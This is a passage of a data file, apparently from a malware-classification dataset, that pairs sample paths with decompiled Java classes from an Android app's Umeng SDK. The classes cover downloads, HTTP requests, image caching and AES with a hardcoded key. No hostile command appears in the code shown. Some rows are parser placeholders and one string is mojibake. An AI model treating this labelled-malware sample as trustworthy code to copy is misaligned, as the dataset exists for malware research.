sb.append(""&"").append(str4).append(""="").append((String)this.c.get(str4));         }       }       try {         Log.a(d.e,nextInt + "": service report:\tget: "" + sb.toString());         HttpGet httpGet=new HttpGet(sb.toString());         BasicHttpParams basicHttpParams=new BasicHttpParams();         HttpConnectionParams.setConnectionTimeout(basicHttpParams,10000);         HttpConnectionParams.setSoTimeout(basicHttpParams,20000);         execute=new DefaultHttpClient(basicHttpParams).execute(httpGet);         Log.a(d.e,nextInt + "": service report:status code:  "" + execute.getStatusLine().getStatusCode());       }  catch (      ClientProtocolException e) {         Log.c(d.e,nextInt + "": service report:\tClientProtocolException,Failed to send message."" + str,e);       } catch (      IOException e2) {         Log.c(d.e,nextInt + "": service report:\tIOException,Failed to send message."" + str,e2);       }       if (execute.getStatusLine().getStatusCode() == 200) {         return;       }     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\f.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4668c46"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\g.code","class g implements DownloadingService.a {   SparseArray<Long> a=new SparseArray<>();   final DownloadingService b;   public g(  DownloadingService downloadingService){     this.b=downloadingService;   }   @Override public void a(  int i){     int i2=0;     if (DownloadingService.F.indexOfKey(i) >= 0) {       d.b bVar=(d.b)DownloadingService.F.get(i);       long[] jArr=bVar.f;       if (jArr != null && jArr[1] > 0 && (i2=(int)((((float)jArr[0]) / ((float)jArr[1])) * 100.0f)) > 100) {         i2=99;       }       if (!bVar.e.h) {         this.a.put(i,-1L);         d.a a=this.b.v.a(this.b,bVar.e,i,i2);         bVar.b=a;         this.b.u.notify(i,a.d());       }     }   }   @Override public void a(  int i,  int i2){     if (DownloadingService.F.indexOfKey(i) >= 0) {       d.b bVar=(d.b)DownloadingService.F.get(i);       a.C0002a c0002a=bVar.e;       long currentTimeMillis=System.currentTimeMillis();       if (!c0002a.h && currentTimeMillis - this.a.get(i).longValue() > 500) {         this.a.put(i,Long.valueOf(currentTimeMillis));         d.a aVar=bVar.b;         aVar.a(100,i2,false).a(String.valueOf(i2) + ""%"");         this.b.u.notify(i,aVar.d());       }       Log.c(DownloadingService.t,String.format(""%3$10s Notification: mNotificationId = %1$15s\t|\tprogress = %2$15s"",Integer.valueOf(i),Integer.valueOf(i2),c0002a.b));     }   }   @Override public void a(  int i,  String str){     d.b bVar;     if (DownloadingService.F.indexOfKey(i) >= 0 && (bVar=(d.b)DownloadingService.F.get(i)) != null) {       a.C0002a c0002a=bVar.e;       c.a(this.b.A).a(c0002a.a,c0002a.c,100);       Bundle bundle=new Bundle();       bundle.putString(""filename"",str);       if (c0002a.a.equalsIgnoreCase(""delta_update"")) {         Message obtain=Message.obtain();         obtain.what=6;         obtain.arg1=1;         obtain.obj=c0002a;         obtain.arg2=i;         obtain.setData(bundle);         this.b.B.sendMessage(obtain);         return;       }       Message obtain2=Message.obtain();       obtain2.what=5;       obtain2.arg1=1;       obtain2.obj=c0002a;       obtain2.arg2=i;       obtain2.setData(bundle);       this.b.B.sendMessage(obtain2);       Message obtain3=Message.obtain();       obtain3.what=5;       obtain3.arg1=1;       obtain3.arg2=i;       obtain3.setData(bundle);       try {         if (DownloadingService.E.get(c0002a) != null) {           ((Messenger)DownloadingService.E.get(c0002a)).send(obtain3);         }         this.b.v.b(this.b.A,i);       }  catch (      RemoteException e) {         this.b.v.b(this.b.A,i);       }     }   }   @Override public void a(  int i,  Exception exc){     if (DownloadingService.F.indexOfKey(i) >= 0) {       this.b.v.b(this.b.A,i);     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\h.code","public class h implements Runnable {   final String a;   final DownloadingService b;   public h(  DownloadingService downloadingService,  String str){     this.b=downloadingService;     this.a=str;   }   @Override public void run(){     Toast.makeText(this.b.A,this.a,0).show();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\i.code","public class i implements Runnable {   final DownloadingService a;   public i(  DownloadingService downloadingService){     this.a=downloadingService;   }   @Override public void run(){     Boolean unused=DownloadingService.I=false;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\j.code","public class j implements Runnable {   final DownloadingService.b a;   public j(  DownloadingService.b bVar){     this.a=bVar;   }   @Override public void run(){     Context context;     DownloadingService downloadingService=DownloadingService.this;     context=this.a.b;     Toast.makeText(downloadingService,com.umeng.common.a.c.i(context),0).show();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\k.code","public interface k {   void a();   void a(  int i);   void a(  int i,  int i2,  String str);   void b(  int i); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\l.code","public class l {   private static final String a=""UMENG_RUNTIME_CACHE"";   private static final String b=l.class.getName();   private final Context c;   public l(  Context context){     this.c=context;   }   public void a(  int i){     try {       SharedPreferences sharedPreferences=this.c.getSharedPreferences(a,0);       SharedPreferences.Editor edit=sharedPreferences.edit(); synchronized (sharedPreferences) {         edit.putString("""" + i,"""");         edit.commit();       }       Log.a(b,""add nid ["" + i + ""] to runtime cache."");     }  catch (    Exception e) {     }   }   public List<Integer> a(){     ArrayList arrayList=new ArrayList();     try {       SharedPreferences sharedPreferences=this.c.getSharedPreferences(a,0);       Iterator<String> it=sharedPreferences.getAll().keySet().iterator();       while (it.hasNext()) {         try {           int parseInt=Integer.parseInt(it.next());           arrayList.add(Integer.valueOf(parseInt));           Log.a(b,""get nid ["" + parseInt + ""]"");         }  catch (        NumberFormatException e) {         }       }       sharedPreferences.edit().clear().commit();     }  catch (    Exception e2) {     }     return arrayList;   }   public boolean b(){     return this.c.getSharedPreferences(a,0).getAll().size() > 0;   }   public void b(  int i){     try {       SharedPreferences sharedPreferences=this.c.getSharedPreferences(a,0);       if (sharedPreferences.contains("""" + i)) {         SharedPreferences.Editor edit=sharedPreferences.edit();         edit.remove("""" + i);         edit.commit();       }       Log.a(b,""remove nid ["" + i + ""] to runtime cache."");     }  catch (    Exception e) {     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\m.code","public class m {   public static final String a=""pause"";   public static final String b=""continue"";   public static final String c=""cancel"";   public static final String d=""com.umeng.intent.DOWNLOAD"";   public static final String e=""com.umeng.broadcast.download.msg"";   public static String a(  int i,  String str){     if (i == 0) {       return null;     }     return (i + """") + "":"" + str;   }   public static int a(  a.C0002a c0002a){     int currentTimeMillis=(int)System.currentTimeMillis();     if (currentTimeMillis < 0) {       return -currentTimeMillis;     }     return currentTimeMillis;   }   public static PendingIntent a(  Context context,  String str){     Intent intent=new Intent(d);     intent.addFlags(1073741824);     intent.putExtra(e,str);     return PendingIntent.getBroadcast(context,str.hashCode(),intent,134217728);   }   public static PendingIntent b(  Context context,  String str){     Intent intent=new Intent(context,(Class<?>)DownloadingService.class);     intent.putExtra(e,str);     return PendingIntent.getService(context,str.hashCode(),intent,134217728);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\n.code","public class n extends s {   private static final String a=n.class.getName(); public interface a {     void a();     void a(    p.a aVar);   }   public p.a a(  o oVar){     p pVar=(p)a(oVar,p.class);     return pVar == null ? p.a.FAIL : pVar.a;   }   public void a(  o oVar,  a aVar){     try {       new b(oVar,aVar).execute(new Integer[0]);     }  catch (    Exception e) {       Log.b(a,"""",e);       if (aVar != null) {         aVar.a(p.a.FAIL);       }     }   } private class b extends AsyncTask<Integer,Integer,p.a> {     private o b;     private a c;     public b(    o oVar,    a aVar){       this.b=oVar;       this.c=aVar;     }     @Override protected void onPreExecute(){       if (this.c != null) {         this.c.a();       }     }     @Override public void onPostExecute(    p.a aVar){       if (this.c != null) {         this.c.a(aVar);       }     }     @Override public p.a doInBackground(    Integer... numArr){       return n.this.a(this.b);     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\o.code","public abstract class o extends t {   public o(){     super("""");   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\p.code","public class p extends u {   public a a;   public enum a {  SUCCESS,   FAIL}   public p(  JSONObject jSONObject){     super(jSONObject);     if (""ok"".equalsIgnoreCase(jSONObject.optString(""status"")) || ""ok"".equalsIgnoreCase(jSONObject.optString(""success""))) {       this.a=a.SUCCESS;     }  else {       this.a=a.FAIL;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\q.code","public class q {   private static final long c=52428800;   private static final long d=10485760;   private static final long e=1800000;   private static Thread g;   private static final String b=q.class.getName();   public static boolean a=false;   private static final Map<ImageView,String> f=Collections.synchronizedMap(new WeakHashMap()); public interface a {     void a(    p.a aVar);     void a(    b bVar);   }   public enum b {  BIND_FORM_CACHE,   BIND_FROM_NET}   private static String b(  String str){     int lastIndexOf=str.lastIndexOf(""."");     String str2="""";     if (lastIndexOf >= 0) {       str2=str.substring(lastIndexOf);     }     return com.umeng.common.util.h.a(str) + str2;   }   public static String a(  Context context,  String str){     File file;     String canonicalPath;     long j;     if (com.umeng.common.util.h.d(str)) {       return null;     }     try {       String str2=b(str) + "".tmp"";       if (com.umeng.common.b.b()) {         canonicalPath=Environment.getExternalStorageDirectory().getCanonicalPath();         j=c;       }  else {         canonicalPath=context.getCacheDir().getCanonicalPath();         j=d;       }       File file2=new File(canonicalPath + com.umeng.common.a.a);       a(file2,j,e);       file=new File(file2,str2);     }  catch (    Exception e2) {       e=e2;       file=null;     }     try {       file.createNewFile();       FileOutputStream fileOutputStream=new FileOutputStream(file);       InputStream inputStream=(InputStream)new URL(str).openConnection().getContent();       byte[] bArr=new byte[4096];       while (true) {         int read=inputStream.read(bArr);         if (read != -1) {           fileOutputStream.write(bArr,0,read);         }  else {           fileOutputStream.flush();           inputStream.close();           fileOutputStream.close();           File file3=new File(file.getParent(),file.getName().replace("".tmp"",""""));           file.renameTo(file3);           Log.a(b,""download img["" + str + ""]  to ""+ file3.getCanonicalPath());           return file3.getCanonicalPath();         }       }     }  catch (    Exception e3) {       e=e3;       Log.a(b,e.getStackTrace().toString() + ""\t url:\t"" + com.umeng.common.util.h.a+ str);       if (file != null && file.exists()) {         file.deleteOnExit();       }       return null;     }   }   public static File a(  String str,  Context context,  boolean[] zArr) throws IOException {     if (com.umeng.common.b.b()) {       File file=new File(Environment.getExternalStorageDirectory().getCanonicalPath() + com.umeng.common.a.a + str);       file.mkdirs();       if (file.exists()) {         zArr[0]=true;         return file;       }     }     String absolutePath=context.getCacheDir().getAbsolutePath();     new File(absolutePath).mkdir();     a(absolutePath,505,-1,-1);     String str2=absolutePath + com.umeng.common.a.b;     new File(str2).mkdir();     a(str2,505,-1,-1);     File file2=new File(str2);     zArr[0]=false;     return file2;   }   public static boolean a(  String str,  int i,  int i2,  int i3){     try {       Class.forName(""android.os.FileUtils"").getMethod(""setPermissions"",String.class,Integer.TYPE,Integer.TYPE,Integer.TYPE).invoke(null,str,Integer.valueOf(i),-1,-1);       return true;     }  catch (    ClassNotFoundException e2) {       Log.b(b,""error when set permissions:"",e2);       return false;     } catch (    IllegalAccessException e3) {       Log.b(b,""error when set permissions:"",e3);       return false;     } catch (    IllegalArgumentException e4) {       Log.b(b,""error when set permissions:"",e4);       return false;     } catch (    NoSuchMethodException e5) {       Log.b(b,""error when set permissions:"",e5);       return false;     } catch (    InvocationTargetException e6) {       Log.b(b,""error when set permissions:"",e6);       return false;     }   }   public static boolean a(  String str,  int i){     int i2=432;     if ((i & 1) != 0) {       i2=436;     }     if ((i & 2) != 0) {       i2|=2;     }     return a(str,i2,-1,-1);   }   public static void a(  File file,  long j,  long j2) throws IOException {     if (!file.exists()) {       if (!file.mkdirs()) {         Log.b(b,""Failed to create directory"" + file.getAbsolutePath() + "". Check permission. Make sure WRITE_EXTERNAL_STORAGE is added in your Manifest.xml"");       }     }  else     if (a(file.getCanonicalFile()) > j) {       if (g == null) {         g=new Thread(new r(file,j2));       } synchronized (g) {         g.start();       }     }   }   private static long a(  File file){     long j=0;     if (file == null || !file.exists() || !file.isDirectory()) {       return 0L;     }     Stack stack=new Stack();     stack.clear();     stack.push(file);     while (true) {       long j2=j;       if (!stack.isEmpty()) {         j=j2;         for (        File file2 : ((File)stack.pop()).listFiles()) {           if (!file2.isDirectory()) {             j+=file2.length();           }         }       }  else {         return j2;       }     }   }   public static void b(  File file,  long j){     if (file != null && file.exists() && file.canWrite() && file.isDirectory()) {       for (      File file2 : file.listFiles()) {         if (!file2.isDirectory() && new Date().getTime() - file2.lastModified() > j) {           file2.delete();         }       }     }   }   protected static File b(  Context context,  String str) throws IOException {     String canonicalPath;     String b2=b(str);     if (com.umeng.common.b.b()) {       canonicalPath=Environment.getExternalStorageDirectory().getCanonicalPath();     }  else {       canonicalPath=context.getCacheDir().getCanonicalPath();     }     File file=new File(new File(canonicalPath + com.umeng.common.a.a),b2);     if (file.exists()) {       return file;     }     return null;   }   public static void a(  Context context,  ImageView imageView,  String str,  boolean z){     a(context,imageView,str,z,null,null,false);   }   public static void a(  Context context,  ImageView imageView,  String str,  boolean z,  a aVar){     a(context,imageView,str,z,aVar,null,false);   }   public static void a(  Context context,  ImageView imageView,  String str,  boolean z,  a aVar,  Animation animation){     a(context,imageView,str,z,aVar,null,false);   }   public static void a(  Context context,  ImageView imageView,  String str,  boolean z,  a aVar,  Animation animation,  boolean z2){     if (imageView != null) {       f.put(imageView,str);       try {         File b2=b(context,str);         if (b2 != null && b2.exists() && !a) {           if (aVar != null) {             aVar.a(b.BIND_FORM_CACHE);           }           Drawable c2=c(b2.getAbsolutePath());           if (c2 == null) {             b2.delete();           }           b(context,imageView,c2,z,aVar,animation,z2,str);           return;         }         new c(context,imageView,str,b.BIND_FROM_NET,null,z,aVar,animation,z2).execute(new Object[0]);       }  catch (      Exception e2) {         Log.b(b,"""",e2);         if (aVar != null) {           aVar.a(p.a.FAIL);         }       }     }   }   private static boolean a(  ImageView imageView,  String str){     String str2=f.get(imageView);     return (str2 == null || str2.equals(str)) ? false : true;   }   public static synchronized void b(  Context context,  ImageView imageView,  Drawable drawable,  boolean z,  a aVar,  Animation animation,  boolean z2,  String str){ synchronized (q.class) {       if (z2 && drawable != null) {         try {           drawable=new BitmapDrawable(a(((BitmapDrawable)drawable).getBitmap()));         }  catch (        Exception e2) {           Log.b(b,""bind failed"",e2);           if (aVar != null) {             aVar.a(p.a.FAIL);           }         }       }       if (drawable == null || imageView == null) {         if (aVar != null) {           aVar.a(p.a.FAIL);         }         Log.e(b,""bind drawable failed. drawable ["" + drawable + ""]  imageView[+""+ imageView+ ""+]"");       }  else       if (a(imageView,str)) {         if (aVar != null) {           aVar.a(p.a.FAIL);         }       }  else {         if (z) {           imageView.setBackgroundDrawable(drawable);         }  else {           imageView.setImageDrawable(drawable);         }         if (animation != null) {           imageView.startAnimation(animation);         }         if (aVar != null) {           aVar.a(p.a.SUCCESS);         }       }     }   } public static class c extends AsyncTask<Object,Integer,Drawable> {     private Context a;     private String b;     private ImageView c;     private b d;     private boolean e;     private a f;     private Animation g;     private boolean h;     private File i;     public c(    Context context,    ImageView imageView,    String str,    b bVar,    File file,    boolean z,    a aVar,    Animation animation,    boolean z2){       this.i=file;       this.a=context;       this.b=str;       this.f=aVar;       this.d=bVar;       this.e=z;       this.g=animation;       this.c=imageView;       this.h=z2;     }     @Override protected void onPreExecute(){       super.onPreExecute();       if (this.f != null) {         this.f.a(this.d);       }     }     @Override public void onPostExecute(    Drawable drawable){       q.b(this.a,this.c,drawable,this.e,this.f,this.g,this.h,this.b);     }     @Override public Drawable doInBackground(    Object... objArr){       if (q.a) {         try {           Thread.sleep(3000L);         }  catch (        InterruptedException e) {           e.printStackTrace();         }       }       if (this.i != null && this.i.exists()) {         Drawable c=q.c(this.i.getAbsolutePath());         if (c == null) {           this.i.delete();         }         Log.c(q.b,""get drawable from cacheFile."");         return c;       }       try {         q.a(this.a,this.b);         File b=q.b(this.a,this.b);         Drawable c2=(b == null || !b.exists()) ? null : q.c(b.getAbsolutePath());         Log.c(q.b,""get drawable from net else file."");         return c2;       }  catch (      Exception e2) {         Log.e(q.b,e2.toString(),e2);         return null;       }     }   }   public static Drawable c(  String str){     try {       return Drawable.createFromPath(str);     }  catch (    OutOfMemoryError e2) {       Log.e(b,""Resutil fetchImage OutOfMemoryError:"" + e2.toString());       return null;     }   }   private static Bitmap a(  Bitmap bitmap){     try {       Bitmap createBitmap=Bitmap.createBitmap(bitmap.getWidth(),bitmap.getHeight(),Bitmap.Config.ARGB_8888);       Canvas canvas=new Canvas(createBitmap);       Paint paint=new Paint();       Rect rect=new Rect(0,0,bitmap.getWidth(),bitmap.getHeight());       RectF rectF=new RectF(rect);       paint.setAntiAlias(true);       canvas.drawARGB(0,0,0,0);       paint.setColor(-12434878);       canvas.drawRoundRect(rectF,bitmap.getWidth() / 6,bitmap.getHeight() / 6,paint);       paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN));       canvas.drawBitmap(bitmap,rect,rect,paint);       bitmap.recycle();       return createBitmap;     }  catch (    OutOfMemoryError e2) {       Log.e(b,""Cant`t create round corner bitmap. [OutOfMemoryError] "");       return null;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\r.code","public final class r implements Runnable {   final File a;   final long b;   public r(  File file,  long j){     this.a=file;     this.b=j;   }   @Override public void run(){     q.b(this.a,this.b);     Thread unused=q.g=null;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\s.code","public class s {   private static final String a=s.class.getName();   private Map<String,String> b;   public <T extends u>T a(  t tVar,  Class<T> cls){     JSONObject a2;     String trim=tVar.c().trim();     b(trim);     if (t.c.equals(trim)) {       a2=a(tVar.b());     }  else {       a2=t.b.equals(trim) ? a(tVar.d,tVar.a()) : null;     }     if (a2 == null) {       return null;     }     try {       return cls.getConstructor(JSONObject.class).newInstance(a2);     }  catch (    IllegalAccessException e) {       Log.b(a,""IllegalAccessException"",e);       return null;     } catch (    IllegalArgumentException e2) {       Log.b(a,""IllegalArgumentException"",e2);       return null;     } catch (    InstantiationException e3) {       Log.b(a,""InstantiationException"",e3);       return null;     } catch (    NoSuchMethodException e4) {       Log.b(a,""NoSuchMethodException"",e4);       return null;     } catch (    SecurityException e5) {       Log.b(a,""SecurityException"",e5);       return null;     } catch (    InvocationTargetException e6) {       Log.b(a,""InvocationTargetException"",e6);       return null;     }   }   private JSONObject a(  String str,  JSONObject jSONObject){     String jSONObject2=jSONObject.toString();     int nextInt=new Random().nextInt(1000);     Log.c(a,nextInt + "":\trequest: "" + str+ com.umeng.common.util.h.a+ jSONObject2);     HttpPost httpPost=new HttpPost(str);     DefaultHttpClient defaultHttpClient=new DefaultHttpClient(b());     try {       if (a()) {         byte[] a2=com.umeng.common.util.f.a(""content="" + jSONObject2,Charset.defaultCharset().toString());         httpPost.addHeader(""Content-Encoding"",""deflate"");         httpPost.setEntity(new InputStreamEntity(new ByteArrayInputStream(a2),a2.length));       }  else {         ArrayList arrayList=new ArrayList(1);         arrayList.add(new BasicNameValuePair(""content"",jSONObject2));         httpPost.setEntity(new UrlEncodedFormEntity(arrayList,""UTF-8""));       }       HttpResponse execute=defaultHttpClient.execute(httpPost);       if (execute.getStatusLine().getStatusCode() == 200) {         HttpEntity entity=execute.getEntity();         if (entity == null) {           return null;         }         InputStream content=entity.getContent();         Header firstHeader=execute.getFirstHeader(""Content-Encoding"");         String a3=a((firstHeader == null || !firstHeader.getValue().equalsIgnoreCase(""deflate"")) ? content : new InflaterInputStream(content));         Log.a(a,nextInt + "":\tresponse: "" + com.umeng.common.util.h.a+ a3);         if (a3 == null) {           return null;         }         return new JSONObject(a3);       }       Log.c(a,nextInt + "":\tFailed to send message. StatusCode = "" + execute.getStatusLine().getStatusCode()+ com.umeng.common.util.h.a+ str);       return null;     }  catch (    ClientProtocolException e) {       Log.c(a,nextInt + "":\tClientProtocolException,Failed to send message."" + str,e);       return null;     } catch (    IOException e2) {       Log.c(a,nextInt + "":\tIOException,Failed to send message."" + str,e2);       return null;     } catch (    JSONException e3) {       Log.c(a,nextInt + "":\tIOException,Failed to send message."" + str,e3);       return null;     }   }   public boolean a(){     return false;   }   private static String a(  InputStream inputStream){     BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(inputStream),8192);     StringBuilder sb=new StringBuilder();     while (true) {       try {         try {           String readLine=bufferedReader.readLine();           if (readLine != null) {             sb.append(readLine + ""\n"");           }  else {             try {               inputStream.close();               return sb.toString();             }  catch (            IOException e) {               Log.b(a,""Caught IOException in convertStreamToString()"",e);               return null;             }           }         }  catch (        Throwable th) {           try {             inputStream.close();             throw th;           }  catch (          IOException e2) {             Log.b(a,""Caught IOException in convertStreamToString()"",e2);             return null;           }         }       }  catch (      IOException e3) {         Log.b(a,""Caught IOException in convertStreamToString()"",e3);         try {           inputStream.close();           return null;         }  catch (        IOException e4) {           Log.b(a,""Caught IOException in convertStreamToString()"",e4);           return null;         }       }     }   }   private JSONObject a(  String str){     InputStream inputStream;     int nextInt=new Random().nextInt(1000);     try {       String property=System.getProperty(""line.separator"");       if (str.length() <= 1) {         Log.b(a,nextInt + "":\tInvalid baseUrl."");         return null;       }       Log.a(a,nextInt + "":\tget: "" + str);       HttpGet httpGet=new HttpGet(str);       if (this.b != null && this.b.size() > 0) {         for (        String str2 : this.b.keySet()) {           httpGet.addHeader(str2,this.b.get(str2));         }       }       HttpResponse execute=new DefaultHttpClient(b()).execute(httpGet);       if (execute.getStatusLine().getStatusCode() == 200) {         HttpEntity entity=execute.getEntity();         if (entity != null) {           InputStream content=entity.getContent();           Header firstHeader=execute.getFirstHeader(""Content-Encoding"");           if (firstHeader != null && firstHeader.getValue().equalsIgnoreCase(""gzip"")) {             Log.a(a,nextInt + ""  Use GZIPInputStream get data...."");             inputStream=new GZIPInputStream(content);           }  else           if (firstHeader == null || !firstHeader.getValue().equalsIgnoreCase(""deflate"")) {             inputStream=content;           }  else {             Log.a(a,nextInt + ""  Use InflaterInputStream get data...."");             inputStream=new InflaterInputStream(content);           }           String a2=a(inputStream);           Log.a(a,nextInt + "":\tresponse: "" + property+ a2);           if (a2 == null) {             return null;           }           return new JSONObject(a2);         }       }  else {         Log.c(a,nextInt + "":\tFailed to send message. StatusCode = "" + execute.getStatusLine().getStatusCode()+ com.umeng.common.util.h.a+ str);       }       return null;     }  catch (    ClientProtocolException e) {       Log.c(a,nextInt + "":\tClientProtocolException,Failed to send message."" + str,e);       return null;     } catch (    Exception e2) {       Log.c(a,nextInt + "":\tIOException,Failed to send message."" + str,e2);       return null;     }   }   private HttpParams b(){     BasicHttpParams basicHttpParams=new BasicHttpParams();     HttpConnectionParams.setConnectionTimeout(basicHttpParams,10000);     HttpConnectionParams.setSoTimeout(basicHttpParams,20000);     HttpProtocolParams.setUserAgent(basicHttpParams,System.getProperty(""http.agent""));     return basicHttpParams;   }   public s a(  Map<String,String> map){     this.b=map;     return this;   }   private void b(  String str){     if (com.umeng.common.util.h.d(str) || !(t.c.equals(str.trim()) ^ t.b.equals(str.trim()))) {       throw new RuntimeException(""éªŒè¯�è¯·æ±‚æ–¹å¼�å¤±è´¥["" + str + ""]"");     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\t.code","public abstract class t {   protected static String b=""POST"";   protected static String c=""GET"";   protected String d;   public abstract JSONObject a();   public abstract String b();   public String c(){     return b;   }   public t(  String str){     this.d=str;   }   public void a(  String str){     this.d=str;   }   public String d(){     return this.d;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\u.code","public abstract class u {   public u(  JSONObject jSONObject){   }   public u(){   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.util\a.code","public class a {   public static byte[] a(  String str){     return a(str,""ISO-8859-1"");   }   public static byte[] b(  String str){     return a(str,""US-ASCII"");   }   public static byte[] c(  String str){     return a(str,""UTF-16"");   }   public static byte[] d(  String str){     return a(str,""UTF-16BE"");   }   public static byte[] e(  String str){     return a(str,""UTF-16LE"");   }   public static byte[] f(  String str){     return a(str,""UTF-8"");   }   public static byte[] a(  String str,  String str2){     if (str == null) {       return null;     }     try {       return str.getBytes(str2);     }  catch (    UnsupportedEncodingException e) {       throw a(str2,e);     }   }   private static IllegalStateException a(  String str,  UnsupportedEncodingException unsupportedEncodingException){     return new IllegalStateException(str + "": "" + unsupportedEncodingException);   }   public static String a(  byte[] bArr,  String str){     if (bArr == null) {       return null;     }     try {       return new String(bArr,str);     }  catch (    UnsupportedEncodingException e) {       throw a(str,e);     }   }   public static String a(  byte[] bArr){     return a(bArr,""ISO-8859-1"");   }   public static String b(  byte[] bArr){     return a(bArr,""US-ASCII"");   }   public static String c(  byte[] bArr){     return a(bArr,""UTF-16"");   }   public static String d(  byte[] bArr){     return a(bArr,""UTF-16BE"");   }   public static String e(  byte[] bArr){     return a(bArr,""UTF-16LE"");   }   public static String f(  byte[] bArr){     return a(bArr,""UTF-8"");   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.util\b.code","public class b {   private static byte[] a=""uLi4/f4+Pb39.T19"".getBytes();   private static byte[] b=""nmeug.f9/Om+L823"".getBytes();   public static String a(  String str,  String str2) throws Exception {     Cipher cipher=Cipher.getInstance(""AES/CBC/PKCS5Padding"");     cipher.init(1,new SecretKeySpec(a,""AES""),new IvParameterSpec(b));     return c.d(cipher.doFinal(str.getBytes(str2)));   }   public static String b(  String str,  String str2) throws Exception {     Cipher cipher=Cipher.getInstance(""AES/CBC/PKCS5Padding"");     cipher.init(2,new SecretKeySpec(a,""AES""),new IvParameterSpec(b));     return new String(cipher.doFinal(c.b(str)),str2);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.util\c.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2635fec1"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.util\d.code","!org.eclipse.jdt.core.dom.TypeDeclaration@83e0800"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.util\DeltaUpdate.code","public class DeltaUpdate {   private static boolean a=false;   private static final String b=""bspatch"";   public static native int bspatch(  String str,  String str2,  String str3);   public static boolean a(){     return a;   }   public static int a(  String str,  String str2,  String str3){     return bspatch(str,str2,str3);   }   public static String a(  Context context){     return context.getApplicationInfo().sourceDir;   }   public static String b(  Context context){     String a2=a(context);     return !new File(a2).exists() ? """" : h.a(new File(a2));   } static {     try {       System.loadLibrary(b);       a=true;     }  catch (    UnsatisfiedLinkError e) {       a=false;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.util\e.code","public class e {   public static final String a=""ISO-8859-1"";   public static final String b=""US-ASCII"";   public static final String c=""UTF-16"";   public static final String d=""UTF-16BE"";   public static final String e=""UTF-16LE"";   public static final String f=""UTF-8""; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.util\f.code","public class f {   public static int a;   public static byte[] a(  String str,  String str2) throws IOException {     ByteArrayOutputStream byteArrayOutputStream;     Throwable th;     if (h.d(str)) {       return null;     }     Deflater deflater=new Deflater();     deflater.setInput(str.getBytes(str2));     deflater.finish();     byte[] bArr=new byte[8192];     a=0;     try {       byteArrayOutputStream=new ByteArrayOutputStream();       while (!deflater.finished()) {         try {           int deflate=deflater.deflate(bArr);           a+=deflate;           byteArrayOutputStream.write(bArr,0,deflate);         }  catch (        Throwable th2) {           th=th2;           if (byteArrayOutputStream != null) {             byteArrayOutputStream.close();           }           throw th;         }       }       deflater.end();       if (byteArrayOutputStream != null) {         byteArrayOutputStream.close();       }       return byteArrayOutputStream.toByteArray();     }  catch (    Throwable th3) {       byteArrayOutputStream=null;       th=th3;     }   }   public static String a(  byte[] bArr,  String str) throws UnsupportedEncodingException, DataFormatException {     if (bArr == null || bArr.length == 0) {       return null;     }     Inflater inflater=new Inflater();     byte[] bArr2=new byte[100];     inflater.setInput(bArr,0,bArr.length);     StringBuilder sb=new StringBuilder();     while (!inflater.needsInput()) {       sb.append(new String(bArr2,0,inflater.inflate(bArr2),str));     }     inflater.end();     return sb.toString();   } } "
